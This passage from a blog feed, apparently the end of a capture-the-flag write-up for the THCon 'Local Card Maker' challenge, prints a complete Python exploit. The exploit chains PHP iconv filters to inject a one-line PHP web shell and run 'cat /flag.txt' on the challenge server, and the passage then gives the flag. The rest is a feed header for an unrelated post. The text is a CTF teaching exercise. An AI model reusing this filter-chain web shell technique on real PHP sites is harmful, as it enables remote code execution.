wrote the below solution to adapt the method to this challenge:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;python&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-python &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-python&amp;quot; data-lang=&amp;quot;python&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;base64
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;hashlib
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;requests
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Based on https:&amp;#x2F;&amp;#x2F;gist.github.com&amp;#x2F;loknop&amp;#x2F;b27422d355ea1fd0d90d6dbc1e278d4d (until line 52):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;conversions &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;R&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;B&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;C&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;8&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;9&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;f&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;s&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;z&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;U&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;P&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;V&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;0&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;Y&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;W&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;d&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;D&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;7&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;4&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&amp;amp;#39;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Simple but does the trick
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;command &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;cat &amp;#x2F;flag.txt&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#&amp;amp;lt;?=`$_GET[0]`;;?&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;base64_payload &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;PD89YCRfR0VUWzBdYDs7Pz4&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# generate some garbage base64
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.iconv.UTF8.CSISO2022KR|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.base64-encode|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.iconv.UTF8.UTF7|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;c &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;base64_payload[::&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;]:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;conversions[c] &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# decode and reencode to get rid of everything that isn&amp;amp;#39;t valid base64
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.base64-decode|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.base64-encode|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# get rid of equal signs
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.iconv.UTF8.UTF7|&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;filters &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;convert.base64-decode&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;file_to_use &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;index&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;final_payload &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;php:&amp;#x2F;&amp;#x2F;filter&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;filters&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;#x2F;resource=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;file_to_use&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;.encode()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# &amp;amp;quot;Local Card Maker&amp;amp;quot;-specific implementation starts here:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;key_salt &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Thcon_SuP3r_S3cr4t_K3y!&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;base64.encodebytes(final_payload).replace(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;\n&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;buf_hash &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;hashlib.sha1(key_salt &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;buf).hexdigest()&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;buf.decode()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(requests.get(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;http:&amp;#x2F;&amp;#x2F;challenges1.thcon.party:2001&amp;#x2F;index.php?page=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;amp;pHash=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;amp;0=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;% &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(buf, buf_hash, command)).content)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;The result contained the flag &amp;lt;code&amp;gt;Thcon22{_Php_&amp;amp;amp;nd_Ap@che_R000ck5$$_}&amp;lt;&amp;#x2F;code&amp;gt; - I guess the original solution should have used Apache? 😅&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>Bathroom Smart Speaker Part 2 - AirPlay to Bluetooth Speaker via Raspberry Pi</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2022-03-02-bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi&#x2F;"/>
            <updated>2022-03-02T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2022-03-02-bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi&#x2F;</id>
